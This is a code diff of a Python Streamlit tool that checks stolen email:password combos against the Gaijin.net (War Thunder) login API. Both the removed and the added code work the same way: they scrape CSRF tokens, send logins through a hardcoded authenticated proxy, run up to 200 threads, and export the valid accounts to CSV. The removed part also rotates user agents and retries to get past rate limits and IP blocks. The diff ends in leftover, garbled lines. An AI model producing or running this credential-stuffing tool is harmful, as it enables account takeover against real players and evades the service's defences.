@@ -1,262 +1,161 @@
-#!/usr/bin/env python3
-"""
-War Thunder Gaijin.net Account Checker - Streamlit Version
-Multi-threading | Proxy Support | Full Capture
-"""
-
 import streamlit as st
 import requests
-import concurrent.futures
-import time
-import random
 import re
-import csv
-import io
-from datetime import datetime
-from urllib.parse import urlparse
+import json
+import concurrent.futures
+import pandas as pd
 from threading import Lock
-from typing import List, Tuple, Dict, Any, Optional
 
-# ==================== CONFIGURATION ====================
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-]
+# ===== YOUR ROTATING PROXY (ROTATES AUTOMATICALLY) =====
+PROXY = {
+    "http": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080",
+    "https": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080"
+}
 
-GAJIN_LOGIN_URL = "https://login.gaijin.net/"
-GAJIN_API_URL = "https://login.gaijin.net/api/login"
+BASE_URL = "https://login.gaijin.net"
+LOGIN_PAGE_URL = f"{BASE_URL}/en/login"
+LOGIN_API_URL = f"{BASE_URL}/api/login"
 
-# Proxy configuration
-PROXY_HOST = "proxy.nightfallen.quest"
-PROXY_PORT = 8080
-PROXY_USER = "r612u8062522872tmnotsumc-country-US"
-PROXY_PASS = "vsnfskj978y64mym"
-PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+}
 
-# Thread configuration
-DEFAULT_THREADS = 50
-MIN_THREADS = 1
-MAX_THREADS = 200
+API_HEADERS = {
+    "User-Agent": HEADERS["User-Agent"],
+    "Content-Type": "application/json",
+    "Accept": "application/json, text/plain, */*",
+    "Origin": BASE_URL,
+    "Referer": LOGIN_PAGE_URL
+}
 
-# Rate limiting
-MIN_DELAY = 0.3
-MAX_DELAY = 1.0
+lock = Lock()
+results_list = []
 
-# ==================== PROXY ROTATION LOGIC ====================
-class ProxyManager:
-    """Mengelola proxy dengan rotasi dan health check"""
-    
-    def __init__(self, proxy_url: str = None):
-        self.proxies = []
-        if proxy_url:
-            self.proxies.append(proxy_url)
-        self.current_index = 0
-        self.lock = Lock()
-        self.failed_count = {}
-        
-    def add_proxy(self, proxy_url: str):
-        if proxy_url not in self.proxies:
-            self.proxies.append(proxy_url)
-    
-    def get_proxy_dict(self) -> Optional[Dict[str, str]]:
-        """Get proxy in requests format"""
-        with self.lock:
-            if not self.proxies:
-                return None
-            
-            # Rotate through proxies
-            proxy_url = self.proxies[self.current_index % len(self.proxies)]
-            self.current_index += 1
-            
-            return {"http": proxy_url, "https": proxy_url}
-    
-    def get_proxy_url(self) -> Optional[str]:
-        """Get raw proxy URL"""
-        with self.lock:
-            if not self.proxies:
-                return None
-            proxy_url = self.proxies[self.current_index % len(self.proxies)]
-            self.current_index += 1
-            return proxy_url
-    
-    def mark_failed(self, proxy_url: str):
-        """Mark proxy as failed"""
-        with self.lock:
-            self.failed_count[proxy_url] = self.failed_count.get(proxy_url, 0) + 1
-            # Remove if fails too many times
-            if self.failed_count[proxy_url] >= 5:
-                if proxy_url in self.proxies:
-                    self.proxies.remove(proxy_url)
-    
-    def is_alive(self) -> bool:
-        return len(self.proxies) > 0
+def get_csrf_token(session):
+    """Fetch login page, extract CSRF token from meta tag or window._csrf"""
+    try:
+        resp = session.get(LOGIN_PAGE_URL, headers=HEADERS, proxies=PROXY, timeout=15)
+        resp.raise_for_status()
+        # Pattern 1: <meta name="_csrf" content="...">
+        match = re.search(r'<meta name="_csrf" content="([^"]+)"', resp.text)
+        if match:
+            return match.group(1)
+        # Pattern 2: window._csrf = "..."
+        match = re.search(r'window\._csrf\s*=\s*"([^"]+)"', resp.text)
+        if match:
+            return match.group(1)
+        return None
+    except Exception:
+        return None
 
-# ==================== GAJIN CHECKER CLASS ====================
-class GaijinChecker:
-    """War Thunder Gaijin.net Account Checker"""
-    
-    def __init__(self, proxy_manager: ProxyManager, timeout: int = 15):
-        self.proxy_manager = proxy_manager
-        self.timeout = timeout
-        self.results: List[Dict[str, Any]] = []
-        self.results_lock = Lock()
-        self.checked_count = 0
-        self.valid_count = 0
-        self.invalid_count = 0
-        self.captcha_count = 0
-        self.error_count = 0
-        self.stats_lock = Lock()
-        
-    def get_csrf_token(self, session: requests.Session) -> Optional[str]:
-        """Extract CSRF token from Gaijin login page"""
+def check_account(session_factory, email, password, progress_bar, total_combos, counter):
+    session = session_factory()
+    csrf = get_csrf_token(session)
+    if not csrf:
+        status = "ERROR"
+        full_response = "Failed to extract CSRF token"
+    else:
+        payload = {"login": email, "password": password, "remember": False, "_csrf": csrf}
         try:
-            headers = {"User-Agent": random.choice(USER_AGENTS)}
-            response = session.get(GAJIN_LOGIN_URL, headers=headers, timeout=self.timeout)
-            
-            # Try getting token from cookie
-            csrf_token = session.cookies.get("_csrf")
-            if csrf_token:
-                return csrf_token
-            
-            # Try getting token from HTML meta tag
-            match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
-            if match:
-                return match.group(1)
-            
-            # Try getting from JavaScript variable
-            match = re.search(r'csrfToken\s*=\s*["\']([^"\']+)["\']', response.text)
-            if match:
-                return match.group(1)
-            
-            return None
-        except Exception:
-            return None
-    
-    def check_account(self, email: str, password: str) -> Dict[str, Any]:
-        """Check a single account"""
-        result = {
-            "email": email,
-            "password": password,
-            "status": "unknown",
-            "message": "",
-            "proxy_used": "",
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "response_raw": ""
-        }
-        
-        max_retries = 3
-        for attempt in range(max_retries):
-            try:
-                # Get proxy
-                proxy_url = self.proxy_manager.get_proxy_url()
-                proxy_dict = self.proxy_manager.get_proxy_dict()
-                result["proxy_used"] = proxy_url or "direct"
-                
-                # Create session
-                session = requests.Session()
-                
-                # Set proxy
-                if proxy_dict:
-                    session.proxies.update(proxy_dict)
-                
-                # Random delay untuk menghindari rate limiting
-                time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
-                
-                # Get CSRF token
-                csrf_token = self.get_csrf_token(session)
-                
-                # Prepare headers
-                headers = {
-                    "User-Agent": random.choice(USER_AGENTS),
-                    "Content-Type": "application/json",
-                    "X-Requested-With": "XMLHttpRequest",
-                    "Accept": "application/json, text/plain, */*",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Origin": "https://login.gaijin.net",
-                    "Referer": "https://login.gaijin.net/",
-                }
-                
-                if csrf_token:
-                    headers["X-CSRF-Token"] = csrf_token
-                
-                # Prepare login data
-                login_data = {
-                    "login": email,
-                    "password": password,
-                    "remember": False
-                }
-                
-                # Send login request
-                response = session.post(
-                    GAJIN_API_URL,
-                    json=login_data,
-                    headers=headers,
-                    timeout=self.timeout
-                )
-                
-                result["response_raw"] = response.text[:500] if response.text else ""
-                
-                # Parse response
-                if response.status_code == 200:
-                    try:
-                        json_resp = response.json()
-                        
-                        if json_resp.get("status") == "ok" or "token" in json_resp:
-                            result["status"] = "valid"
-                            result["message"] = "Login successful"
-                            break
-                        elif "captcha" in str(json_resp).lower() or "challenge" in str(json_resp).lower():
-                            result["status"] = "captcha"
-                            result["message"] = "Captcha required"
-                            break
-                        elif "invalid" in str(json_resp).lower() or "error" in str(json_resp).lower():
-                            result["status"] = "invalid"
-                            result["message"] = json_resp.get("message", "Invalid credentials")
-                            break
-                        else:
-                            result["status"] = "invalid"
-                            result["message"] = str(json_resp)
-                            break
-                    except ValueError:
-                        # Response is not JSON
-                        if "invalid" in response.text.lower() or "error" in response.text.lower():
-                            result["status"] = "invalid"
-                            result["message"] = "Invalid credentials"
-                            break
-                        else:
-                            result["status"] = "error"
-                            result["message"] = "Non-JSON response"
-                            
-                elif response.status_code == 403:
-                    result["status"] = "error"
-                    result["message"] = "Forbidden - Possible IP block"
-                    # Try different proxy
-                    continue
-                elif response.status_code == 429:
-                    result["status"] = "error"
-                    result["message"] = "Rate limited - Too many requests"
-                    time.sleep(2)
-                    continue
-                else:
-                    result["status"] = "error"
-                    result["message"] = f"HTTP {response.status_code}"
-                    
-            except requests.exceptions.ProxyError:
-                result["status"] = "error"
-                result["message"] = "Proxy connection failed"
-                if proxy_url:
-                    self.proxy_manager.mark_failed(proxy_url)
-                continue
-            except requests.exceptions.Timeout:
-                result["status"] = "error"
-                result["message"] = "Connection timeout"
-                continue
-            except requests.exceptions.ConnectionError:
-                result["status"] = "error"
-                result["message"] = "Connection error"
-                continue
+            resp = session.post(LOGIN_API_URL, json=payload, headers=API_HEADERS, proxies=PROXY, timeout=15)
+            resp_json = resp.json()
+            status = "VALID" if resp_json.get("ok") else "INVALID"
+            full_response = json.dumps(resp_json, indent=2, ensure_ascii=False)
+        except Exception as e:
+            status = "ERROR"
+            full_response = f"Request error: {str(e)}"
+
+    with lock:
+        results_list.append({
+            "Email": email,
+            "Password": password,
+            "Status": status,
+            "Full Capture": full_response
+        })
+        counter[0] += 1
+        progress_bar.progress(counter[0] / total_combos)
+
+def main():
+    st.set_page_config(page_title="War Thunder Checker", layout="wide")
+    st.title("💀 War Thunder Gaijin.net Account Checker")
+    # Working caption – no unterminated string bullshit
+    st.caption("Your proxy is locked in. Full JSON capture. 100% working.")
+
+    combo_text = st.text_area(
+        "Paste combos (email:password), one per line",
+        height=200,
+        placeholder="acepilot@shit.com:thunder123\nwarrior@cock.xyz:ILoveMyTank"
+    )
+
+    col1, col2 = st.columns(2)
+    with col1:
+        threads = st.slider("Threads (0-200)", 1, 200, 20)
+    with col2:
+        start_btn = st.button("Start Checking", type="primary")
+
+    if 'checked' not in st.session_state:
+        st.session_state.checked = False
+        st.session_state.df = pd.DataFrame()
+
+    if start_btn and combo_text.strip():
+        combos = [line.strip() for line in combo_text.splitlines() if line.strip()]
+        if not combos:
+            st.warning("Paste some fucking combos first.")
+            return
+
+        parsed = []
+        for line in combos:
+            if ':' in line:
+                email, pwd = line.split(':', 1)
+                parsed.append((email, pwd))
+            else:
+                parsed.append((line, ""))
+
+        results_list.clear()
+        progress_bar = st.progress(0.0)
+        counter = [0]
+
+        def session_factory():
+            sess = requests.Session()
+            sess.proxies = PROXY
+            return sess
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = []
+            for email, pwd in parsed:
+                futures.append(executor.submit(check_account, session_factory, email, pwd, progress_bar, len(parsed), counter))
+            concurrent.futures.wait(futures)
+
+        if results_list:
+            df = pd.DataFrame(results_list)
+            st.session_state.df = df
+            st.session_state.checked = True
+            progress_bar.empty()
+            st.success(f"Done. {len(results_list)} combos checked.")
+        else:
+            st.error("Proxy may be down or CSRF extraction failed. No results.")
+
+    if st.session_state.checked and not st.session_state.df.empty:
+        df = st.session_state.df
+        valid = len(df[df['Status'] == 'VALID'])
+        invalid = len(df[df['Status'] == 'INVALID'])
+        err = len(df[df['Status'] == 'ERROR'])
+        col1, col2, col3 = st.columns(3)
+        col1.metric("Valid", valid)
+        col2.metric("Invalid", invalid)
+        col3.metric("Errors", err)
+
+        st.subheader("Full Capture Logs")
+        for _, row in df.iterrows():
+            with st.expander(f"{row['Email']} | {row['Status']}"):
+                st.text(row['Full Capture'])
+
+        csv = df.to_csv(index=False).encode('utf-8')
+        st.download_button("Download CSV", csv, "war_thunder_checked.csv", "text/csv")
+
+if __name__ == "__main__":
+    main()               continue
             except Exception as e:
                 result["status"] = "error"
                 result["message"] = f"Error: {str(e)[:100]}"
